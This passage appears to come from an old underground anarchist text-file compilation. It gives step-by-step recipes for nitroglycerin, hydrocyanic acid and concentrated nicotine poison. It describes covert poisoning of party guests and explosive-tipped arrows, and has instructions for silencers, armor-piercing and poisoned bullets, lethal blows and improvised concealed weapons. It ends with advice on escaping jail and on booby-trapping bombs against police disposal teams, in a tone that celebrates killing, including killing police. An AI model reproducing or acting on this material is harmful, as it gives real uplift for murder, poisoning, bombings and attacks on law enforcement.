your enemy lose his balance, the chances are nine to
one that you can kill him in your next move. The best over-all
stance is where your feet are spread about shoulders width apart, 
with your right foot about a foot ahead of the left. Both arms
should be bent at the elbows parallel to each other. Stand on the
balls of your feet and bend your waist slightly. Kinda of like a
boxer's crouch. Employing a sudden movement or a scream or yell can
throw your enemy off-balance. There are many vulnerable points of
the body. We will cover them now:
Eyes:Use your fingers in a V-shape and attack in gouging motion.
Nose:(Extremely vulnerable) Strike with the knife edge of the hand
along the bridge, which will cause breakage, sharp pain, temporary
blindness, and if the blow is hard enough, death. Also, deliver a blow 
with the heel of your hand in an upward motion, this will shove the
bone up into the brain causing death.
Adam's Apple: This spot is usually pretty well protected, but if you
get the chance, strike hard with the knife edge of your hand. This
should sever the wind-pipe, and then it's all over in a matter of
minutes.
Temple: There is a large artery up here, and if you hit it hard
enough, it will cause death. If you manage to knock your enemy down,
kick him in the temple, and he'll never get up again.
Back of the Neck: A rabbit punch, or blow delivered to the base of
the neck can easily break it, but to be safe, it is better to
use the butt of a gun or some other heavy blunt object.
Upper lip: A large network of nerves are located. These nerves are
extrememly close to the skin. A sharp upward blow will cause extreme
pain, and unconciosness.
Ears: Coming up from behind an enemy and cupping the hands in a clapping
motion over the victims ears can kill him immediately. The vibrations
caused from the clapping motion will burst his eardrums, and cause 
internal bleeding in the brain.
Groin: A VERY vulnerable spot. If left open, get it with knee
hard, and he'll buckle over very fast.
Kidneys: A large nerve that branches off to the spinal cord comes very
close to the skin at the kidneys. A direct blow with the knife edge
of your hand can cause death.
There are many more ways to kill and injure an enemy, but these should
work best for the average person. This is meant only as information
and I would not recommend that you use this for a simple High School Brawl.
Use these methods only, in your opinion, if your life is in danger.
Any one of these methods could very easily kill or cause permanent damage
to someone. One more word of caution, you should practice these moves
before using them on a dummy, or a mock battle with a friend.
(You don't have to actually hit him to practice, just work on accuracy.)
Its GRRRRRRRREAT!!!!!!!!!!
here's another of the primative sort enjoy!!

Blowgun                                         by The Jolly Roger
In this article I shall attempt to explain the use and manufacture
of a powerfull blow-gun and making darts for the gun.The possesion of
the blow gun described in this article IS a felony.
So be carefull where you use it. I don't want to get you all busted.
Needed:
1. Several strands of yarn (About 2 inches a-piece)
2. A regular pencil
3. A 2 1/4 inch long needle (hopefully with a beaded head. If not
   obtainable,wrap tape around end of needle.
4. 2-3 1/4 foot pipe. (PVC or Aluminum) Half a inch in diameter
Constructing the dart:
1st- Carefully twist and pull the metal part (Along with eraser)
of the pencil till it comes off.
2nd- Take Pin and start putting about 5-7 Strands of yarn on the pin. Then
push them up to the top of the pin. But not over the head of the pin (orthe tape).
3rd- Push pin through the hollow part of the head where the pencil was before.
4th- That should for a nice looking dart. (see illustration)
     #####
>>>>>-----/    #  is the yarn     
               >  is the head of the pencil
               -  is the pin it-self
               /  is the head of the pin
Using the Darts:
  
1st- Now take the finished dart and insert it in the tube
(if it is too small put on more yarn.)
2nd- Aim the tube at a door, wall, sister, ect.
3rd- blow on the end of the pipe.
4th- Sometimes the end of the pipe may be sharp. When this happens I
suggest you wrap it with some black electrician tape.It should feel
a lot better.

Here's one for the SUICIDAL mercinary!
Nitroglycerin Recipe                            by the Jolly Roger
Like all chemists I must advise you all to take the greatest care
and caution when you are doing this.  Even if you have made this stuff
before.
This first article will give you information on making
nitroglyerin, the basic ingredient in a lot of explosives such as
straight dynamites, and geletin dynamites.
Making nitroglycerin
1. Fill a 75-milliliter beaker to the 13 ml. Level with fuming
   red nitric acid, of 98% pure concentration.
2. Place the beaker in an ice bath and allow to cool below room
   temp.
3. After it has cooled, add to it three times the amount of
   fuming sulferic acid (99% h2so4).  In other words, add to the
   now-cool fuming nitric acid 39 ml. Of fuming sulferic acid.
   When mixing any acids, always do it slowly and carefully to
   avoid splattering.
4. When the two are mixed, lower thier temp. By adding more ice
   to the bath, about 10-15 degrees centigrade. (Use a
   mercury-operated thermometer)
5. When the acid solution has cooled to the desired temperature,
   it is ready for the glycerin. The glycerin must be added in
   small amounts using a medicine dropper.  (Read this step about
   10 times!)  Glycerin is added slowly and carefully (i mean
   careful!) Until the entire surface of the acid it covered with
   it.
6. This is a dangerous point since the nitration will take place
   as soon as the glycerin is added. The nitration will produce
   heat, so the solution must be kept below 30 degrees
   centigrade! If the solution should go above 30 degrees,
   immediately dump the solution into the ice bath!  This will
   insure that it does not go off in your face!
7. For the first ten minutes of nitration, the mixture should be
   gently stirred.  In a normal reaction the nitroglycerin will
   form as a layer on top of the acid solution, while the sulferic
   acid will absorb the excess water.
8. After the nitration has taken place, and the nitroglycerin has
   formed on the top of the solution, the entire beaker should be 
   transferred slowly and carefully to another beaker of water. 
   When this is done the nitroglycerin will settle at the bottem
   so the other acids can be drained away.
9. After removing as much acid as posible without disturbing the
   nitroglycerin, remove the nitroglycerin with an eyedropper and
   place it in a bicarbonate of soda (sodium bicarbonate in case
   you didn't know) solution.  The sodium is an alkalai and will
   nuetralize much of the acid remaining. This process should be
   repeated as much as necesarry using blue litmus paper to check
   for the presence of acid.  The remaining acid only makes the
   nitroglycerin more unstable than it already is.
10. Finally! The final step is to remove the nitroglycerin from
    the bicarbonate.  His is done with and eye- dropper, slowly
    and carefully.  The usual test to see if nitration has been
    successful is to place one drop of the nitroglycerin on metal
    and ignite it.  If it is true nitroglycerin it will burn with
    a clear blue flame.
** Caution **
Nitro is very sensative to decomposition, heating dropping, or
jarring, and may explode if left undisturbed and cool.

now just leave it on his porch against the door or something like that so he
spills it and BOOOOOMMMM!!!!! the only problem here is getting it to his 
house without going BOOM yourself (I can't offer any suggestions because 
I've been smart enough NOT to mess with the stuff)
 
Here's a great one to do to his car:

Mix solid Nitric Iodine with househould ammonia. Wait overnight and
then pour off the liquid. You will be left with a muddy substance. Let
this dry till it hardens.  Now throw it at something!!!!
                                ------------Exodus-----------
What you do with this stuff is to put in his door hinge or something that 
contacts hard when he normally drives.

Low Signature Systems (Silencers)                  by the Jolly Roger
     Low signature systems (silencers) for improvised small arms weapons 
can be made from steel gas or water pipe and fittings.
Material Required:
-----------------
Grenade Container
Steel pipe nipple, 6 in. (15 cm) long - (see table 1 for diameter)
2 steel pipe couplings - (see table 2 for dimensions)
Cotton cloth - (see table 2)
Drill
Absorbent cotton
Procedure:
---------
1) Drill hole in grenade container at both ends to fit outside diameter 
of pipe nipple. (see table 1)

                               5 in.
2) Drill four rows of holes in pipe nipple. Use table 1 for diameter and 
location of holes.
                      (Note: I suck at ASCII art!)
                             
                                6 in.

                          B (dia.)             A
3) Thread one of the pipe couplings on the drilled pipe nipple.
4) Cut coupling length to allow barrel of weapon to thread fully into low 
signature system. Barrel should butt against end of the drilled pipe 
nipple.
5) Seperate the top half of the grenade container from the bottom half.
6) Insert the pipe nipple in the drilled hole at the base of the bottom 
half of the container. Pack theabsorbent cotton inside the container and 
around the pipe nipple.
7) Pack the absorbent cotton in top half of grenade container leaving 
hole in center. Assemble container to the bottom half.
8) Thread the other coupling onto the pipe nipple.
Note: A longer container and pipe nipple, with same "A" and "B" 
dimensions as those given, will furthur reduce the signature of the 
system.
How to use:
----------
1) Thread the low signature system on the selected weapon securely.
2) Place the proper cotton wad size into the muzzle end of the system 
(see table 2)
3) Load weapon
4) Weapon is now ready for use

(Note: you MUST get the specs exact for silencers or else YOU will be 
 the victim, I just thought I'd mention that)
Now for those of you who don't want to buy a gun or register it. You 
can make one (of course you might not want to register it because it's
ILLEGAL)
One very good method if your mark is a Cop is shoot him with armor
percing bullets. These can be made very easily all you do is buy a teflon 
coated pan, scrape off the teflon, melt it down dip the tips of the bullets 
in it and let them cool. Now you have your very own set of cop killers.
Isn't that nice hehehe!!!!!!!!
Another nice little bullet creation is the dum dum bullet. To make it just
saw off the tip of the bullet sand it down and mark it with a *. It should
look like my diagram or at least close to it. What this baby does is instead
of mushrooming or staying whole is breaks apart in mid air and tears the 
target to shreds with the nice little shrapnel effect it has. Try hunting
with that.

Hey all you crazy people now is where the fun begins now is where I 
tell you about MANY things that can kill, mame and cause a shit load
of damage. 
Impact exploding arrows (hehehe)
        These are impact exploding arrows, and how to make them.  These
babies are lethal, and explode on impact.  The obvious advantage to these is
that their hit-kill ratio is extremely high, and they are silent (Until they
hit). Another obvious advantage is that most of the evidence is destroyed or
sprayed over a vast area. Any hit to the torso or head will prove fatal, and
most destructive. So on with it another lesson in pain.

-Procedure-
-=-=-=-=-=-
(1)    Remove the arrow head from shaft, and drop 5 drops of epoxy resin in
       the arrow shaft.  Allow drying time according to the procedure
       outlayed in the instructions on the glue.
(2)    Now that the glue is dry start adding in the RDX explosive, and
       loosely packing it down with the wooden dowel. Now continue this
       process until RDX explosive is within reach of the top leaving enough
       room to fit a mini-compound detonator and enough room to screw the
       arrow tip on about 1 1/2 inches.
(3)    Now Take the arrow tip (Not on the Shaft) and put it in a vise-grip,
       and drill your needle sized hole.  It might be easier to flatten the
       tip then drill the hole to assure that it is centered.  Now set this
       aside for later use.
(4)    Now make the mini-compound detonator, but differently this time make
       it backwards using a .22 shell with primer intact (One that hasn't
       been fired) Now put in you 1/8 an inch of gunpowder first, then
       your 1/4 inch of acetone peroxide or mercury fulminate, then your
       5/8 of an inch with RDX.  However this time pack it very very
       loosely with  the ram, so as not to set off the primer and have it
       explode in your face.
(5)    Now set the mini compound detonator in the arrow shaft with the RDX
       with the primer pointing upwards (Getting the Picture).  Now pour a
       little RDX around the edges of the .22 shell, and then using a FEW
       drops of epoxy resin secure the mini-compound detonator in place, so
       that it is PERFECTLY centered.
(6)    Now screw the arrow tip back on the arrow, and place a needle in the
       hole you drilled earlier.  If the hole is too loose then the needle
       will fall out, so stuff some paper around it.  If the hole is too
       tight the needle won't hit the primer and detonate the arrow, so
       drill a little bigger hole.

        This is one of the best things I have ever encountered, and has the
most potential for fun. The added weight however does effect the velocity of
the arrow, but not so much the accuracy as was thought before adequate
testing was done.  Enjoy, and...
This next section will deal with guns :-)
        First off I will list the various types of calibers of weapons to
choose from, and the most feared sniper rifle of all and it's specifications
My personnel favorite and the most feared weapon is the 7.62 ball nato rifle
and in a moment I will demonstrate why.  Although don't fret any weapon is
lethal hell here is an interesting fact for you. The longest verified sniper
kill was executed during the civil war (believe it or not) when a sniper
killed a general one mile away.

5.56mm Armalite           990                         173
        Obviously you can now see how overrated the .357 magnum is the 7.62
Ball Nato is 3 times more powerful, and is also known to easily pierce light
armor. Also a special curved windscreen is employed to stop 5.56 and 7.62
ammo.  Well enough bragging on my favorite rifle on with the specs and then
you choose your weapon.
Fabrique National Snipe Weapons
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       These wonderful people produce a 7.62mm sniper rifle with a removable
bipod.  This weapon is accurate up to 600 meters away (If thats hard to
visualize picture 475 people lying toe to head).  It comes standard with a
Zeiss Diavari D telescopic sight.  It also features an adjustable strap and
variable butt length.  This comes in handy when your intended victim takes
his time. This weapon is mainly used by Belgium police forces in
anti-terrorist operations however it can be bought in the U.S.  The weapon
also holds 4 rounds with a fifth shell in the chamber.
McMillan M-82 and M-86 Sniper Weapons
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
        This is one of the local police weapons used for sniping however it
is one of the best ones on the market. The only drawback here is, it is bolt
action, and if you are a lousy shot your in trouble. However it comes from
the factory with a fiberglass stock, and a 24 inch, 1 in 12 twist stainless
steel barrel. It also comes with the ultra 10x-M1 scope, however to use this
weapon to it's full ability I suggest shopping around for a better scope,and
having it calibrated to at least 700 yards.
Garrand M1A
-=--=-=-=-=
       The ultimate in the sniper rifles on the commercial market.  The only
weapon that even comes close is the german made Springer,but that's too hard
to find.  This weapon is accurate as hell with a 1000 yard+ range.  It is a
heavy weapon, and this reduces the kick.  It was primarily used by the
marines in Vietnam era. These weapons can be found in collectors stores i.e.
Collectors Firearms or bought through the NRA (National Rifle Association),
but if you buy through the NRA you tend to have a wait period of 6 months.
I highly recommend this weapon it is the cutting edge of the technological
age on the field of honor.

        Listen these people do not usually sell to the public, so write to
them for a catalog and say you are a police officer and want to buy
somethings for personnel use, but first call and ask if they sell to the
public.
        Great aren't they these are the things dreams and evil are made of.
Now for a section on armor piercing bullets. And other kinds of lethal
bullets.
        Take your average bullet, and coat it in Teflon. Simple enough eh?
Well thats it, now what this bullet does instead of breaking apart is it
stays whole, and is capable of piercing through bullet proof vests at long
ranges, not to mention steel.  Another method is to make your bullets out of
different materials like tungsten, steel, etc... However this article is not
going to go into how to cast bullets.  Since there are many books on it in
various gun stores, etc....
-=-=-=-=-=-=-=-=-=-=-
-Exploding Destroyer-
-=-=-=-=-=-=-=-=-=-=-
        This is my own version of the dum dum bullet. O.K. take your bullet,
and cut off the end and sand it down, so that it is flat. Now take a knife
and cut an asterisk (*) into the bullet.  On impact this bullet will explode
and spray into about 15 pieces of shrapnel, and totally destroy it's target.
-=-=-==-=-=-
-Evil Eddie-
-=-=-==-=-=-
        This is another of my bastard creations.  Take a hollow point bullet,
and fill the hollow point with mercury.  Now take a soldering iron, and drip
a drop of solder over the point to seal it in.  Note: Sometimes it is
necessary to widen the hollow point, so the bullet will fill with mercury.
Now what this does is when the bullet is shot the mercury heats up and
expands, and rips apart the victim,and if it doesn't kill him with the first
shot the mercury gets into his blood and poisons him.  This one is a sure
fire lethal shot!
-=-=-=-=-=-=-=-=
-Poison Bullets-
-=-=-=-=-=-=-=-=
        Now with these the poison is your preference, and you can either (A)
put the poison in the tip of a hollow point and seal it in, or (B) heat
poison over a regular or dum-dum bullet.  The one that works the best is the
hollow point with poison sealed inside,and coated and heated on the outside.
Now you can either use cyanide or mercuric oxide works well.  However there
are hundreds of other poisons to choose from like botulinis toxin, etc....
Now for my favorite and probably your favorite too. POISONS
Since the beginning of time, there have always been dickheads, assholes,
rapists, thieves, murderers, and the dog next door that bites the shit out
of each time you walk by. And since the beginning of these problems there
has always been the process of elimination. This file explains how to
kill the dog next door through the modern technique of poisoning.
----------------------------------------------------------------------------
   -----------------
  | ETHYLENE GLYCOL |
   -----------------
  Ethylene Glycol is simply antifreeze such as Prestone,Zerex, etc. It has a
sweetish-like taste to it and can be easily concealed in a bowl of punch, or
someones softdrink.  At a party, ethylene glycol can be easily poured from 
a container such as a kool-aid pitcher into the party punch. Be sure it is
mixed with a package of kool-aid or something so that you don't arouse any
suspicion. The lethal dosage of this is about four ounces and the good thing
about ethylene glycol is that a person that is dying from it simply appears
to be drunk...
   ----------------------
  | CARBON TETRACHLORIDE |
   ----------------------
  Carbon Tetrachloride can be easily obtained from fire extinguishers or
grease cleaning fluids found in auto supply stores. Carbon Tetrachloride is
used in making phosgene gas which is highly lethal and was used in World War
I.The gas is made by heating carbon tetrachloride over a flame or hot plate.
It's only effective in a closed room. A good way to utilize this is to set a
pan full of it on a heater. People seeing it will just think its water often
placed on heaters to keep the air from being too dry. Carbon tetrachloride
has the smell of musty hay and will most likely be ignored or someone will
bring there can of lysol and spray the air with it.
   ----------
  | NICOTINE |
   ----------
  Nicotine is a highly lethal, horrifying poison. One drop of pure nicotine
has been known to kill in less than fifteen minutes. Its taste is easily
concealedd in sweet substances such as soda, kool-aid, etc. Almost pure
nicotine can be obtained from the round flat boxes of snuff. Pour the snuff
out into a container and add enough water to cover it all.Let it soak for 24
hours then take a handkerchief and stuff it into a cup with the edges of the
hand-kerchief over the sides. Pour it into the handkerchief so that the
liquid is filtered out from the snuff. Squeeze the handkerchief to get out
any excess liquid. Discard the snuff and pour the liquid into a small
saucepan over a low fire. When the liquid has evaporated to about a small
teaspoon of a thick dark substance your poison is finished. A lethal dosage
is about two or so drops.
   ------------------
  | NICOTINE SULFATE |
   ------------------
  This is one of the most interesting poisons of mine. It is obtained as an
insect poison found under several names. One of the most common is Black
Leaf 40, found at any garden store. It is 40% nicotine sulfate. It is most
effective if it is evaporated to a thin syrup. The interesting thing about
nicotine sulfate is that it is absorbed through the skin.An effective way to
use this is to carry it around in a softdrink then "accidentally" spill on
victim. If he does not wash it off in a matter of seconds he'll be dead in a
matter of  minutes. Most likely, the victim will just forget about it if he
thinks it is  just a softdrink.
   ------------------
  | HYDROCYANIC ACID |
   ------------------
  Hydrocyanic acid (Prussic Acid) is one of the most poisonous compounds
known.  It is quite simple to prepare and is extremely deadly. A good way to
use this is to put it in a water piston. Use a newspaper and proceed to walk
pass the  victim as you read the newspaper. When you near him squirt him in
the face and continue walking. Before he realizes he has been attacked he'll
fall unconscious. Within three minutes he'll be dead. To start the process
you will the following items:
Potassium Ferrocyanide        This can be stolen from your school lab or
                              purchased from a chemical supply house.
  Distilled Water             Found at your common grocery store
  Sulfuric Acid               Can be obtained by emptying the watery
                              contents from a car battery and boiling it in
                              a glass  container until thick white fumes
                              appear or you steal it from your school lab.
  Calcium Chloride            Can be obtained by breaking up chalk and
                              letting it soak in hydrochloric acid (obtained
                              at a hardware store) and then drying it.
  Measure out 15 parts of potassium ferrocyanide and dump it into a flask.
Next add 9 parts of distilled water and 9 parts of strong sulfuric acid
(poured slowly). Then take another flask and put in some coarse fragments of
calcium chloride. Your apparatus should look like this:
                                               To air out flask

  Plastic tubing (obtained from a tropical fish store) is ran from the acid,
potassium, water mixture into a bucket full of ice and water.A small hole is
cut near the bottom of the bucket just barely enough to fit the plastic
tubing into so that the icy water does not leak.Then the tubing is lead into
the flask  containing the calcium chloride where the final product will be
collected.  Start by heating the acid, potassium, water mixture at a low
temp, be sure to  watch it as it may boil over the top. When the liquid
covers the potassium  chloride the action is stopped and the apparatus is
allowed to cool. The  liquid is put into a container with a good stopper.
Light and air cause hydro-cyanic acid to lose its potency. The container
should be wrapped in foil and  stored in a refrigerating device. A few drops
of hydrochloric acid will help  preserve your cyanic acid.
For those people with a conciense I suggest the next article.
Laughing gas
 Laughing Gas
 ------------
 Laughing gas was one of the first anesthetics used. After a little while of
inhaling the patient became so happy he could not keep from laughing.
Finally  he would drift off to a pleasant sleep. To make it, first you need
some of the which you can get in a cold pack avalible in drug stores. 
Dissolve a quantity of it in a pot. Then evaporate it in a pot over a 
medium flame until you have a heavy brine. Take out a cold metal plate
and drop a drop of it on the plate. If it solidifies almost instantly then 
pour the brine onto the metal plate. After awhile break it up into pieces 
and store it in a container. To make the gas, put a spoonful into a flask 
and run some plastic tubing from the flask to a plastic bag. Your apparatus
should look like this:

 To generate the gas, heat the flask under a low flame, when the temperature
reaches 480 F the gas will generate. Be careful, the stuff explodes at 600 F
so it is advised that you put a thermometer in the flask, otherwise your
parents will spend thousands on plastic surgery for you. After the plastic
bag is full,stop the process and poke a small hole in the bag. Hold it under
your nose and inhale and whee.....have fun..

       This type of tack they are usually silver, and not that hard to find.
I believe the correct terminology is Push Tack.
[-------------]
[ Preparation ]
[-------------]
        These are simple to make, so this should be a relatively short and
composed file.
1)Take a glove <right or left> and put it on.
2)Pull out a length of tape that will reach from the middle of your hand all
  the way over the tip of your finger and to the other side of your hand.
  <This way both sides of your hand will have about two to three inches of
  tape over them, and the tape will extend to the end of your finger.> Also
  don't put the tape on yet.
3)Now take the push tacks and punch them through the tape before you put it
  on your hand, so that the tacks will have their backs facing your fingers.
  Now for the space between your knuckles put about five tacks, and then
  put the tape over your hand.  <If that wasn't too clear what the
  meaning here is, is the tacks go facing outward and stick to the sticky
  side of the tape, and then the tape is placed on the finger and over the
  hand.  That way one finger is now armed with four or five spikes.
4)Now repeat the above steps for the other four fingers.
5)Now wrap the tape around your hand six times that way the loose ends from
  the tape on your fingers out onto your hands won't come off.
6)Repeat the process for the other glove.
7)Now depending on you, you can add more spikes to the bottom of your hand,
  the sides, the bottom flat half of your hand, and the lower palm of your
  hand.  This is what I suggest you do for the intimidating look.  Also when
  adding spikes make a fist and hit to make sure they are placed correctly.
  Also note that spikes on the knuckles hurt when you hit!

As usual I take absolutely no responsibility for anything that you do with this
text. If you decide to print this out and beat the shit out of someone with
it YOU ARE RESPONSIBLE NOT ME!!! Let it also be known that if you escape from
jail and are caught don't blame me because the methods are for the most part 
fool proof so if you get caught chances are YOU FUCKED UP NOT ME. Remember 
you're the person who got convicted in the first place. I was too smart for 
them. well enough with that shit!!!

How to kill (MANY WAYS) 
How to make or hide weapons.
Credits
(this list isn't in any order)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
How to kill with minimal weapons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1)Throw the person down and kick them in the temple.
2)Crush their skull (kick them in the head when they are beside a wall)
3)Break their wrist and tear the veins as they pop out (they will believe me)
4)Smash the 4th vertibra (the one that sticks out at the back of the neck)
5)Punch where the spine meets the skull. (its in the back of their head)
6)Give them CPR (surprisingly if you do it hard enough their heart will stop)
7)Take a good shot at the windpipe if you hit it he'll die in 30 seconds or
  less.
8)Punch very hard where the two groups of ribs meet (in front). Death is 
  immediate depending on how hard you hit.
9)Turn their head around so they'll be able to see you while the body is 
  facing forward.
10)Break their nose with a blow that forces the nose sideways then with 
   another shot force it up into the brain. (other files say to do this with
   one shot but most people don't have the strength or dexterity to do that.
11)Grab their shirt collar with your weak hand and pound the shit out of them
   with the other hand. (if done enough death will result)
12)Dislocate their arm then as it hangs wrap it around their neck. (thus 
   choking them)
13)Throw them down then kick them until they stop breathing.
14)Break the collar bone then hit them in the shoulder this will cut off the
   windpipe and juggular.
15)Box their ears (VERY HARD)
16)Run them over. 
17)Slam their face into a brick wall MANY times.
18)Knock them unconceise then stomp on their head while wearing heavy boots.
19)Slam them with an combination lock.
20)Use a lead pipe (need I say more)
Well that's it for now. (gotta save some for the next issue)

# The Art of Conceiled Weapons #
################################
Sawed off Shot gun
~~~~~~~~~~~~~~~~~~
   Take a shot gun saw off the stock and some of the pipe if you want a
better spread. (Hard isn't it)
The Sawed off PELLET GUN
~~~~~~~~~~~~~~~~~~~~~~~~
   Don't laugh, this actually works. What you do is saw off a pellet gun like
you would a shotgun. While this does increase power it also decreases accuracy.
(so in english, you can't hit a white whale on a black background). This is
best if you have many people do this then you have something deadly.
The Bloody Punch
~~~~~~~~~~~~~~~~
   I have a set of these myself. All you gotta do is just take a piece of 
wood that you can fit into your hand and punch with. Then take some files and
sandpaper (so you don't get splinters) sand in some grooves for your fingers.
Put nails through the wood so they will stick out between your fingers. Wrap
this in tape if you want (just in case the wood split like on mine). Now 
punch someone you really hate. Note the title of this article fitting isn't 
it?
Batman Sharp Thingy
~~~~~~~~~~~~~~~~~~~
   Ever watch batman? You know the thing that he throws and it sticks into 
things. That's what this is. You need some thing for this one.
You need:Fairly small piece of sheet metal (depends on how big ya want it)
~~~~~~~~~Bench grinder (this is manditory unless you want to do the grinding by hand)
         Tin Snips (saves time you might be able to do without them)
         Some spare time and a little imagination
   Take the piece of sheet metal and cut it into a shape that will work good
I have a standard diagram I'll give at the end. Now sharpen it with the bench
grinder.

Pretty impressive eh? 
All you do is throw it so it spins sharp edge first. Note: these are illegal.
Police Baton
~~~~~~~~~~~~
   To make this all ya do is get two pieces of wood drill one out for the hand
grip then stick them on a lathe. Then fit them together and presto. You got a
Cop beater!!!! Nice isn't it? 
The Old Ball and Chain
~~~~~~~~~~~~~~~~~~~~~~
   This weapon is simple to make and easy to conceil. All you do is get a 
length of chain put a hole in a blunt metal object so the chain will fit 
through. String it up and presto. Swing it around, blundgeon your enemies, 
impress your friends. (if you like making weapons try taking metal shop, 
usually the teacher either doesn't care or is too stupid to stop you!)
Bundle o' Nails
~~~~~~~~~~~~~~~
   Take common nails (the perfectly straight ones) and tie them together. This
may seem lame but imagine getting hit with the pointy end. 
Wood knuckles
~~~~~~~~~~~~~
   Take a piece of wood drill holes to put your fingers in then punch 
something hard if it hurts then sand them (the holes) closer until it fits 
good, then get into a fight.
Deadly Pen
~~~~~~~~~~
   Get the nicotine recipe from last issue of mercinary today. Pull the 
writing part (metal thing) of the ink cartridge, coat a needle with the 
nicotine. Put the needle in the cartridge of a clicker pen and when you wish
to use this click the pen then stab them in an area where it will get into 
the blood quick.

#          The Art of Escaping From Jail         #
##################################################
Always have a Plan
~~~~~~~~~~~~~~~~~~
Prison guards tend to be gun toting trigger happy big Motherfuckers. And if 
you attempt to escape and they see you they'd rather kill you then waste time
hunting you. (no one misses a jail bird) 
Kiss Ass
~~~~~~~~
If you do this a lot you can get many privlages and have access to stuff you
need. (like pieces of metal to cut stuff with)
Be resourcful
~~~~~~~~~~~~~
If your not the resourcful type then escape with someone who is because this
is essential to the whole escape plan, if something goes wrong you MUST have
an escape plan.
READ
~~~~
The prison system is no "Club Med" but they do alloy you to read. Get books 
on chemistry, Metalurgy, Locksmithing, etc.. It doesn't hurt to ask if you
can have these books. The most they can do is turn you down. Ask for mags on
almost anything because there is bound to be an article somewhere that can 
give you some ideas.
Use your Imagination
~~~~~~~~~~~~~~~~~~~~
The sky's the limit. I can tell you how to make a drill out of a spoon, but
with no imagination you won't know how to use it. Envision stuff. If you have
a piece of metal you have a start, but what will you do with it?  
(this might be an on going article so I think I'll stop now, my brain hurts)

#        Evading Bomb Squad Tactics      #
##########################################
        This article will deal with the modern methods used by police and
military bomb squad teams and how to overcome them. Most police forces have a
bomb squad or IED(Improvised Explosive Device)unit, but some rely on the army
EOD (Explosive Ordnance Disposal) unit.  This is done, because small local
police forces rarely have a need for a bomb squad or the funding to outrig
one with the necessary equipment.  Well enough of the background on with the
article, in which I will outlay equipment and how to evade it.
-=-=-=-=-=-=-=-=-=-
-Police Protection-
-=-=-=-=-=-=-=-=-=-
        As of the writing of this article the most widely used form of
protection is the Canadian Safeco body suits.  These suits are made of kevlar
and ballistic material and basically protect the pig from shrapnel and shock
wave.  However there are many design flaws in the suit, which I will outline.
(1) The officers hands must be exposed, because gloves would be too bulky to
    maneuver, and hinder his sense of touch.
(2) The other design flaw is the suit weighs a little over 50 pounds, and
    there is the constant problem of heat stroke etc...; Since the suit is
    very hot.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Overcoming This Problem-
-=-=-=-=-=-=-=-=-=-=-=-=-
        The solution here is quite simple, and the best option is to leave
 the best option is to either...
(A)     Put the bomb out in the direct sunlight if you live in a hot climate.
        (A hot climate is temperatures in the 98-108 range.)
(B)     Place the explosive device in a boiler room.
(C)     Place it under a primary heating duct.
(D)     Use your imagination your intelligent.
-=-=-=-=-=-=-=-=-=-
-Disarming Robots!-
-=-=-=-=-=-=-=-=-=-
        The police force recently has been employing robots in disarming
procedures. The most popular one is the Pedsco RMI a canadian robot that runs
on six pneumatic tires; It also has a camera and a claw all of which are
controlled remotely. These robots however are pretty much strictly limited to
large police forces, because of their cost.  The design flaws in this are
obvious...
(1)     It is like the game where you get the prize with the claw.  Or in
        other words it is difficult to operate, and is mainly used for moving
        the explosive device into a bomb transporter.
(2)     It only has one camera and one has to become extremely accustomed to
        the new depth perception via the camera.
(3)     They are almost never used in disarming procedures since they are too
        jerky.  They are used to move the explosive to a bomb transporter.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Overcoming This Problem-
-=-=-=-=-=-=-=-=-=-=-=-=-
        There are many different solutions, which can be applied here. I will
outline a few of the more interesting ones that won't readily come to mind.
(A)    This is my personnel favorite employ multiple explosives, and
       surround your bomb with minurature landmines, which will destroy the
       disarming robot.
(B)    Another is to employ a secondary detonator into your device which
       is shock or sudden movement sensitive, so that if the operator of the
       claws drops the explosive or jolts it, it will detonate.
(C)    Another is to attach multiple detonators to the sides of the explosive
       so that when the claws close in on the device it will detonate.
-=-=-=-=-=-=-=-=-
-Portable X-rays-
-=-=-=-=-=-=-=-=-
        Police have more often used portable x-ray units. These units are
called inspectors, and manufactured by golden. They run on their own
batteries and use polaroid x-ray film.  These are most effective usually
since a relatively accurate x-ray can be procured in less than 20 seconds.
The obvious design flaws in the are as follows:
(1)     Certain materials are not susceptible to x-ray such as lead.
(2)     It takes a well trained person to interpret an x-ray correctly.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Overcoming This Problem-
-=-=-=-=-=-=-=-=-=-=-=-=-
        The ways of overcoming this are obvious, but I will outlay them here
for those of you whose minds are slow.
(A)     Encasing the explosive device in lead or some other material which
        will successfully evade the x-ray.
(B)     Adding shit or miscellaneous metals inside the bomb to confuse the
        person interpreting the x-ray.
-=-==-=-=-
-Dearmers-
-=-==-=-=-
       What the fuck is a dearmer you ask? Well a dearmer is usually employed
by the bomb squad when it is apparent that device can be made docile by
destroying it's wiring.A dearmer is an electronically fired gun that shoots a
 variety of projectiles at a high velocity into the explosive. The purpose of
this is to destroy the wiring rendering the explosive useless. They look like
miniature pipes, and can be fired remotely.There are a few design flaws here,
but less than before that can be manipulated to our advantage.
(1)     They can't cut through steel.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Overcoming This Problem-
-=-=-=-=-=-=-=-=-=-=-=-=-
(A)     The solution here is to encase the wiring in some way to prevent
        cutting.
(B)     Another method for those of you who dare is to coat the wiring of the
        device with a compound that will detonate from shock, and
        will in turn detonate the explosive.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Bomb Transport Vehicles-
-=-=-=-=-=-=-=-=-=-=-=-=-
    Yes, those oddly shaped vehicles that they carry away our explosives in.
Well this took quite a bit of research to find out all of the types, but here
it goes. The first type is the spherical transporter, round in shape it is
used when even a directed blast could cause injury, death, or destruction
i.e. in such areas as where there are tall buildings and a large populous.
The other type is either of one cylinder or multiple concentric cylinders
with spaces between them. The general purpose of these is to direct the blast
upward, so as not to cause injury or destruction.  The explosive is
suspended in a net in the center of the cylinder. Most of the times these
are used to take the device to a safe area for detonation, but are designed
just in case the bomb goes KABOOM. Here there really aren't design flaws, but
there are ways to overcome his problem.
-=-=-=-=-=-=-=-=-=-=-=-=-
-Overcoming This Problem-
